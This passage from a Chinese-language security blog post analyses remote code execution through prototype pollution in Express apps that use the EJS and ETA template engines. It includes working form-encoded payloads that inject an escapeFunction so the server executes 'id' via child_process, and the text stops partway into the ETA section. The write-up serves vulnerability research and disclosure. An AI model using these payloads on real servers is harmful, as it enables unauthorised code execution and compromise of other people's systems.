{"title":"NodeJS template CVEs","date":"2023-03-06T08:44:44.000Z","date_formatted":{"ll":"Mar 6, 2023","L":"03/06/2023","MM-DD":"03-06"},"link":"2023/03/06/NodeJS-template-CVEs","tags":["CVEs"],"updated":"2023-03-08T09:53:40.755Z","content":"<p>這個議題是從 Cyku 大大在 AIS3 EOF 2019 Quals 以及 AIS3 EOF 2020 Final 分別出的兩題 echo 以及 echo2，第一個是 ejs template 第二個是 pug template<br>\n之後在 AIS3 2022 的時候想專題題目的時候想到了這兩題想說會不會沒修或是說沒修完的情況，於是把最新的 source code 拿來分析也順利的找到沒修完的 0-day 也有拿到該屆的最佳專題獎<br>\n這邊很感謝當時的隊友王博靚、Lillian 以及 hurosu 的幫忙</p>\n<p>漏洞的成因是因為 express.js 提供了一些設定值控制模板渲染，如果控制了這些參數可以影響模板在渲染時候的結果導致 RCE</p>\n<span id=\"more\"></span>\n<h2 id=\"ejs-template\">EJS template<a title=\"#ejs-template\" href=\"#ejs-template\"></a></h2>\n<ul>\n<li>這邊先給 Cyku 大大的原始 write up\n<ul>\n<li><a href=\"https://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md\" target=\"_blank\">https://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md</a></li>\n</ul>\n</li>\n<li>當時看個時候 ejs 的版本是 <code>3.1.8</code></li>\n<li>基本上就是把 Cyku 大大的題目的 ejs 版本改成最新版本來分析而已，其他的部分完全沒有變</li>\n</ul>\n<h3 id=\"code-review\">Code review<a title=\"#code-review\" href=\"#code-review\"></a></h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;body-parser&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(bodyParser.<span class=\"title function_\">urlencoded</span>(&#123; <span class=\"attr\">extended</span>: <span class=\"literal\">true</span> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;index.ejs&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> data = req.<span class=\"property\">body</span>;</span><br><span class=\"line\">    res.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;echo.ejs&#x27;</span>, data);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">49007</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>主要的 code 就長上面這個樣子，可以看到在 <code>let data = req.body</code> 有很明顯的 prototype pollution，是從這邊污染了模板渲染的參數</li>\n<li>接下來就是追程式碼了，在 <code>node_modules/ejs/lib/ejs.js</code> 裡面的 <code>renderFile</code> function 是 <code>res.render</code> 會呼叫到的 function\n<ul>\n<li><a href=\"https://expressjs.com/zh-tw/guide/using-template-engines.html\" target=\"_blank\">https://expressjs.com/zh-tw/guide/using-template-engines.html</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">與 Express 相容的範本引擎（例如 Pug）會匯出一個名稱是 __express(filePath, options, callback) 的函數，以供 res.render() 函數呼叫，來呈現範本程式碼。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// node_modules/ejs/lib/ejs.js</span></span><br><span class=\"line\"><span class=\"comment\">// 926</span></span><br><span class=\"line\"><span class=\"built_in\">exports</span>.<span class=\"property\">__express</span> = <span class=\"built_in\">exports</span>.<span class=\"property\">renderFile</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>因此我們需要找 <code>renderFile</code> 這個 function 裡面是怎麼處理傳給他的資料的</li>\n<li>追一下程式碼可以看到他的呼叫順序</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tryHandleCache(opts, data, cb)</span><br><span class=\"line\">-&gt; handleCache(options)(data)</span><br><span class=\"line\">   -&gt; exports.compile(template, options)</span><br><span class=\"line\">      -&gt; Template(template, opts).compile()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在最後 compile 的時候會把程式碼組起來然後跑</li>\n<li>主要需要看的是 compile 會吃什麼樣的 options 並且要在 <code>renderFile</code> 那裡可以把自己要的 config 加進去</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">viewOpts = data.<span class=\"property\">settings</span>[<span class=\"string\">&#x27;view options&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (viewOpts) &#123;</span><br><span class=\"line\">    utils.<span class=\"title function_\">shallowCopy</span>(opts, viewOpts);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>utils.shallowCopy</code> 做的事情就是把所有的 <code>options</code> 複製到 <code>opts</code> 並且透過 <code>handleCache</code> 傳下去</li>\n<li>之後就只需要看 <code>compile</code> 這個 function 有沒有可以利用的地方就可以了</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (opts.<span class=\"property\">outputFunctionName</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!_JS_IDENTIFIER.<span class=\"title function_\">test</span>(opts.<span class=\"property\">outputFunctionName</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">&#x27;outputFunctionName is not a valid JS identifier.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    prepended += <span class=\"string\">&#x27;  var &#x27;</span> + opts.<span class=\"property\">outputFunctionName</span> + <span class=\"string\">&#x27; = __append;&#x27;</span> + <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>這邊提一個地方，這個是原本 Cyku 大大在 AIS3 出的題目，可以看到是有修補好的，有經過 regex 檢查</li>\n<li>往後看到下面的程式碼</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> escapeFn = opts.<span class=\"property\">escapeFunction</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 省略</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (opts.<span class=\"property\">client</span>) &#123;</span><br><span class=\"line\">    src = <span class=\"string\">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class=\"title function_\">toString</span>() + <span class=\"string\">&#x27;;&#x27;</span> + <span class=\"string\">&#x27;\\n&#x27;</span> + src;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (opts.<span class=\"property\">compileDebug</span>) &#123;</span><br><span class=\"line\">    src = <span class=\"string\">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class=\"title function_\">toString</span>() + <span class=\"string\">&#x27;;&#x27;</span> + <span class=\"string\">&#x27;\\n&#x27;</span> + src;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以明顯地看到他是沒有經過 regex 的驗證並且他是直接拼接的，所以這邊很有可能可以拼接惡意的程式碼</li>\n<li>基於上面的程式碼可以構造以下的 payload</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=escapeFn;console.log(123);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以發現說會報錯</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TypeError: esc is not a function</span><br><span class=\"line\">    at rethrow (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:5:18)</span><br><span class=\"line\">    at echo (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:38:3)</span><br><span class=\"line\">    at tryHandleCache (/usr/src/app/node_modules/ejs/lib/ejs.js:274:36)</span><br><span class=\"line\">    at View.exports.renderFile [as engine] (/usr/src/app/node_modules/ejs/lib/ejs.js:491:10)</span><br><span class=\"line\">    at View.render (/usr/src/app/node_modules/express/lib/view.js:135:8)</span><br><span class=\"line\">    at tryRender (/usr/src/app/node_modules/express/lib/application.js:640:10)</span><br><span class=\"line\">    at Function.render (/usr/src/app/node_modules/express/lib/application.js:592:3)</span><br><span class=\"line\">    at ServerResponse.render (/usr/src/app/node_modules/express/lib/response.js:1012:7)</span><br><span class=\"line\">    at /usr/src/app/app.js:15:9</span><br><span class=\"line\">    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果不要這個錯誤的話需要塞給他一個 function，可以用 <code>function()&#123;console.log(123)&#125;</code> 代替</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;console.log(123)&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後看到自己的 terminal 就可以看到 console output 啦</li>\n<li>最後拼出來的程式碼大概長下面的樣子</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rethrow = rethrow || <span class=\"keyword\">function</span> <span class=\"title function_\">rethrow</span>(<span class=\"params\">err, str, flnm, lineno, esc</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> lines = str.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> start = <span class=\"title class_\">Math</span>.<span class=\"title function_\">max</span>(lineno - <span class=\"number\">3</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> end = <span class=\"title class_\">Math</span>.<span class=\"title function_\">min</span>(lines.<span class=\"property\">length</span>, lineno + <span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> filename = <span class=\"title function_\">esc</span>(flnm);</span><br><span class=\"line\">    <span class=\"comment\">// Error context</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> context = lines.<span class=\"title function_\">slice</span>(start, end).<span class=\"title function_\">map</span>(<span class=\"keyword\">function</span> (<span class=\"params\">line, i</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> curr = i + start + <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (curr == lineno ? <span class=\"string\">&#x27; &gt;&gt; &#x27;</span> : <span class=\"string\">&#x27;    &#x27;</span>)</span><br><span class=\"line\">        + curr</span><br><span class=\"line\">        + <span class=\"string\">&#x27;| &#x27;</span></span><br><span class=\"line\">        + line;</span><br><span class=\"line\">    &#125;).<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Alter exception message</span></span><br><span class=\"line\">    err.<span class=\"property\">path</span> = filename;</span><br><span class=\"line\">    err.<span class=\"property\">message</span> = (filename || <span class=\"string\">&#x27;ejs&#x27;</span>) + <span class=\"string\">&#x27;:&#x27;</span></span><br><span class=\"line\">        + lineno + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">        + context + <span class=\"string\">&#x27;\\n\\n&#x27;</span></span><br><span class=\"line\">        + err.<span class=\"property\">message</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> err;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">escapeFn = escapeFn || <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">1234</span>)&#125;;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> __line = <span class=\"number\">1</span></span><br><span class=\"line\">  , __lines = <span class=\"string\">&quot;&lt;%=text %&gt;\\n&quot;</span></span><br><span class=\"line\">  , __filename = <span class=\"string\">&quot;/usr/src/app/views/echo.ejs&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> __output = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">__append</span>(<span class=\"params\">s</span>) &#123; <span class=\"keyword\">if</span> (s !== <span class=\"literal\">undefined</span> &amp;&amp; s !== <span class=\"literal\">null</span>) __output += s &#125;</span><br><span class=\"line\">    <span class=\"keyword\">with</span> (locals || &#123;&#125;) &#123;</span><br><span class=\"line\">        ; <span class=\"title function_\">__append</span>(escapeFn(text ))</span><br><span class=\"line\">        ; <span class=\"title function_\">__append</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">        ; __line = <span class=\"number\">2</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __output;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">rethrow</span>(e, __lines, __filename, __line, escapeFn);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到惡意的程式碼被拼接起來啦</li>\n</ul>\n<h3 id=\"踩坑\">踩坑<a title=\"#踩坑\" href=\"#踩坑\"></a></h3>\n<ul>\n<li>接下來要想辦法執行系統指令，通常會用 <code>require(&quot;child_process&quot;)</code>，在這邊使用的話會噴錯</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ReferenceError: require is not defined</span><br><span class=\"line\">    at escapeFn (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:24:35)</span><br><span class=\"line\">    at rethrow (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:5:18)</span><br><span class=\"line\">    at echo (eval at compile (/usr/src/app/node_modules/ejs/lib/ejs.js:674:12), &lt;anonymous&gt;:38:3)</span><br><span class=\"line\">    at tryHandleCache (/usr/src/app/node_modules/ejs/lib/ejs.js:274:36)</span><br><span class=\"line\">    at View.exports.renderFile [as engine] (/usr/src/app/node_modules/ejs/lib/ejs.js:491:10)</span><br><span class=\"line\">    at View.render (/usr/src/app/node_modules/express/lib/view.js:135:8)</span><br><span class=\"line\">    at tryRender (/usr/src/app/node_modules/express/lib/application.js:640:10)</span><br><span class=\"line\">    at Function.render (/usr/src/app/node_modules/express/lib/application.js:592:3)</span><br><span class=\"line\">    at ServerResponse.render (/usr/src/app/node_modules/express/lib/response.js:1012:7)</span><br><span class=\"line\">    at /usr/src/app/app.js:15:9</span><br></pre></td></tr></table></figure>\n<ul>\n<li>往下追一下可以看到他會用 <code>FunctionConstructor</code> 來構造拼接好的程式碼</li>\n<li>在 Node.js 中，<code>require</code> 是一個全局對象，可以用來導入其他的 JavaScript 模塊。但是在使用 <code>FunctionConstructor</code> 創建新的函數時，這個新函數的作用域和全局作用域是不同的，因此在新函數中使用 <code>require</code> 就會報錯 “require is not defined”（chatGPT 的回答）</li>\n<li>以上的回答滿完整的解答了為什麼會噴錯</li>\n<li>接下來要找有沒有可以構造的 payload，參考了網路上找得到的 payload 發現下面的 payload 可以用</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(<span class=\"string\">&#x27;child_process&#x27;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&#x27;id&#x27;</span>).<span class=\"title function_\">toString</span>()</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>global.process</code> 是 Node.js 中的全局程式，它包含了關於當前 Node.js 程式的資訊和控制方法。</li>\n<li><code>global.process.mainModule</code> 是 Node.js 應用程式的主 module。</li>\n<li><code>global.process.mainModule.constructor</code> 是主 module 的構造函數。</li>\n<li><code>_load('child_process')</code> 是 Module 中的一個方法，用於 load Node.js 內建的 child_process module。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;console.log(global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>用上面的 payload 就可以在自己的 terminal 上面看到 <code>id</code> 的結果啦</li>\n<li>因為沒有回顯，可以打一個 reverse shell 出來比較方便</li>\n<li>也可以用下面的 payload 就有回顯了</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text=1&amp;settings[view options][client]=whatever&amp;settings[view options][escapeFunction]=function()&#123;return (global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>用組出來的程式碼分析一下</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">escapeFn = escapeFn || <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">return</span> (<span class=\"variable language_\">global</span>.<span class=\"property\">process</span>.<span class=\"property\">mainModule</span>.<span class=\"property\">constructor</span>.<span class=\"title function_\">_load</span>(<span class=\"string\">&#x27;child_process&#x27;</span>).<span class=\"title function_\">execSync</span>(<span class=\"string\">&#x27;id&#x27;</span>).<span class=\"title function_\">toString</span>())&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> __line = <span class=\"number\">1</span></span><br><span class=\"line\">  , __lines = <span class=\"string\">&quot;&lt;%=text %&gt;\\n&quot;</span></span><br><span class=\"line\">  , __filename = <span class=\"string\">&quot;/usr/src/app/views/echo.ejs&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> __output = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">__append</span>(<span class=\"params\">s</span>) &#123; <span class=\"keyword\">if</span> (s !== <span class=\"literal\">undefined</span> &amp;&amp; s !== <span class=\"literal\">null</span>) __output += s &#125;</span><br><span class=\"line\">    <span class=\"keyword\">with</span> (locals || &#123;&#125;) &#123;</span><br><span class=\"line\">        ; <span class=\"title function_\">__append</span>(escapeFn(text ))</span><br><span class=\"line\">        ; <span class=\"title function_\">__append</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">        ; __line = <span class=\"number\">2</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __output;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">rethrow</span>(e, __lines, __filename, __line, escapeFn);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>output</code> 是最後顯示出來的結果，後面的 function <code>__append</code> 會影響 <code>output</code> 的內容，所以只要 function return string 就可以看到回顯啦</li>\n</ul>\n<h2 id=\"eta-template\">ETA template<a title=\"#eta-template\" href=\"#eta-template\"></a></h2>\n<ul>\n<li>這個主要是隊友 王博靚 找到的，後續我有自己分析過，當時分析的版本如下</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;dependencies&quot;</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;eta&quot;</span>: <span class=\"string\">&quot;^1.12.3&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;express&quot;</span>: <span class=\"string\">&quot;^4.18.1&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>寫這篇時候他的最新版本是 <code>2.0.1</code>，下面分析的也會是以 <code>2.0.1</code> 為主</li>\n</ul>\n<h3 id=\"code-review-1\">Code review<a title=\"#code-review-1\" href=\"#code-review-1\"></a></h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;body-parser&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"title function_\">express</span>();</span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(bodyParser.<span class=\"title function_\">urlencoded</span>(&#123; <span class=\"attr\">extended</span>: <span class=\"literal\">true</span> &#125;));</span><br><span class=\"line\">app.<span class=\"title function_\">set</span>(<span class=\"string\">&#x27;views&#x27;</span>, __dirname + <span class=\"string\">&#x27;/views&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    res.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;index.eta&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> data = req.<span class=\"property\">body</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data);</span><br><span class=\"line\">    res.<span class=\"title function_\">render</span>(<span class=\"string\">&#x27;echo.eta&#x27;</span>, data);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(<span class=\"number\">49008</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>主程式我只有稍微給一下 Cyku 大大的題目</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// index.eta</span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span 